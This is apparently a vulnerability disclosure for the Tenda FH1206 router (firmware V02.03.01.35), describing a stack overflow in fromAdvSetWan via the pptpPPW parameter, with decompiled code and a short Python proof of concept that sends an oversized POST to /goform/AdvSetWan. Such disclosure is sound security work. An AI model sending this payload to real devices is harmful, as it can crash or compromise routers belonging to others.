## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromAdvSetWan` function. This function accepts the `wanmode`  parameter from a POST request. Within `case 3`, this function accepts the `pptpPPW` parameter from a POST request, which is assigned to `decodePwd(v11, v52);`. However, since the user has control over the input of `pptpPPW`, the function `decodePwd()` leads to a buffer overflow. The user-supplied `pptpPPW` can exceed the capacity of the `v52` array, thus triggering this security vulnerability.

![image-20240802202733291](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240802202733291.png)

```c
_BYTE *__fastcall decodePwd(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // $v0
  _BYTE *v3; // [sp+8h] [+8h]
  _BYTE *v4; // [sp+Ch] [+Ch]

  v3 = a1;
  v4 = a2;
  result = a1;
  if ( a1 )
  {
    result = a2;
    if ( a2 )
    {
      while ( *v3 )
      {
        if ( *v3 == 92 )
          ++v3;
        *v4++ = *v3++;
      }
      result = v4;
      *v4 = 0;
    }
  }
  return result;
}
```

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/AdvSetWan"
payload = b"a"*1000

data = {"wanmode":"3","pptpPPW": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240801202321673](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)